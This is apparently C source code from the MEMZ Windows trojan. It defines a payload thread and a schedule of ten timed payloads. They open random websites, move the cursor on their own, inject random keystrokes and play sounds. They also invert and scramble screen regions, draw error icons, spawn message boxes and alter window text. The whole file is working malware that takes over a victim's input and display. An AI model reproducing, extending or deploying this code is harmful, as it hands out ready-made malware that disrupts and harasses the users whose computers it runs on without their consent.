#include "MEMZ.h"

// Payload-Host
DWORD WINAPI PayloadThread(LPVOID lpParameter) {
	int Delay = 0;
	int Times = 0;
	int Runtime = 0;

	PAYLOAD *Payload = (PAYLOAD*)lpParameter;

	for (;;) {
		if (Delay-- == 0) {
			Delay = (Payload->PayloadFunction)(Times++, Runtime);
		}

		Runtime++;

		Sleep(10);
	}
}

// Payload-Schedule
PAYLOAD Payloads[] = {
{ PayloadExecute, 30000 },
{ PayloadCursor, 30000 },
{ PayloadKeyboard, 20000 },
{ PayloadSound, 50000 },
{ PayloadBlink, 30000 },
{ PayloadMessageBox, 20000 },
{ PayloadDrawErrors, 10000 },
{ PayloadChangeText, 40000 },
{ PayloadPIP, 60000 },
{ PayloadPuzzle, 15000 }
};
const size_t nPayloads = sizeof(Payloads) / sizeof(PAYLOAD);

INT PayloadExecute(PAYLOADFUNC) {
	ShellExecute(NULL, L"open", Sites[Random() % nSites], NULL, NULL, SW_SHOWDEFAULT);

	return 0x5dc / (Times / 0xf + 0x1) + 0x64 + (Random() % 0xc8);
}

INT PayloadCursor(PAYLOADFUNC) {
	POINT Cursor;
	GetCursorPos(&Cursor);

	SetCursorPos(Cursor.x + (Random() % 0x3 - 0x1) * (Random() % (Runtime / 0x898 + 0x2)), Cursor.y + (Random() % 0x3 - 0x1) * (Random() % (Runtime / 0x898 + 0x2)));

	return 0x2;
}

INT PayloadKeyboard(PAYLOADFUNC) {
	INPUT Input;

	Input.type = INPUT_KEYBOARD;
	Input.ki.wVk = (Random() % (0x5a - 0x30)) + 0x30;
	SendInput(1, &Input, sizeof(INPUT));

	return 0x12c + (Random() % 0x190);
}

INT PayloadSound(PAYLOADFUNC) {
	PlaySound(Sounds[Random() % nSounds], GetModuleHandle(NULL), SND_ASYNC);
	return 0x14 + (Random() % 0x14);
}

INT PayloadBlink(PAYLOADFUNC) {
	HWND hWnd = GetDesktopWindow();
	HDC hDc = GetWindowDC(hWnd);
	RECT rEkt;
	GetWindowRect(hWnd, &rEkt);
	BitBlt(hDc, 0, 0, rEkt.right - rEkt.left, rEkt.bottom - rEkt.top, hDc, 0, 0, NOTSRCCOPY);
	ReleaseDC(hWnd, hDc);

	return 0x64;
}

INT PayloadMessageBox(PAYLOADFUNC) {
	CreateThread(NULL, 0x1000, &MessageBoxThread, NULL, NULL, NULL);

	return 0x7d0 / (Times / 0x8 + 0x1) + 0x14 + (Random() % 0x1e);
}

INT PayloadDrawErrors(PAYLOADFUNC) {
	int ix = GetSystemMetrics(SM_CXICON) / 0x2;
	int iy = GetSystemMetrics(SM_CYICON) / 0x2;

	HWND hWnd = GetDesktopWindow();
	HDC hDc = GetWindowDC(hWnd);

	POINT Cursor;
	GetCursorPos(&Cursor);

	DrawIcon(hDc, Cursor.x - ix, Cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

	if (Random() % (int)(0xa / (Times / 0x1f4 + 0x1) + 0x1) == 0) {
		DrawIcon(hDc, Random() % scrw, Random() % scrh, LoadIcon(NULL, IDI_WARNING));
	}

	ReleaseDC(hWnd, hDc);

	return 0x2;
}

INT PayloadChangeText(PAYLOADFUNC) {
	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);

	return 0x32;
}

INT PayloadPIP(PAYLOADFUNC) {
	HWND hWnd = GetDesktopWindow();
	HDC hDc = GetWindowDC(hWnd);
	RECT rEkt;
	GetWindowRect(hWnd, &rEkt);
	StretchBlt(hDc, 0x32, 0x32, rEkt.right - 0x64, rEkt.bottom - 0x64, hDc, 0, 0, rEkt.right, rEkt.bottom, SRCCOPY);
	ReleaseDC(hWnd, hDc);

	return 0xc8 / (Times / 0x5 + 0x1) + 0x4;
}

INT PayloadPuzzle(PAYLOADFUNC) {
	HWND hWnd = GetDesktopWindow();
	HDC hDc = GetWindowDC(hWnd);
	RECT rEkt;
	GetWindowRect(hWnd, &rEkt);

	int x1 = Random() % (rEkt.right - 0x64);
	int y1 = Random() % (rEkt.bottom - 0x64);
	int x2 = Random() % (rEkt.right - 0x64);
	int y2 = Random() % (rEkt.bottom - 0x64);
	int Width = Random() % 0x258;
	int Height = Random() % 0x258;

	BitBlt(hDc, x1, y1, Width, Height, hDc, x2, y2, SRCCOPY);
	ReleaseDC(hWnd, hDc);

	return 0xc8 / (Times / 0x5 + 0x1) + 0x3;
}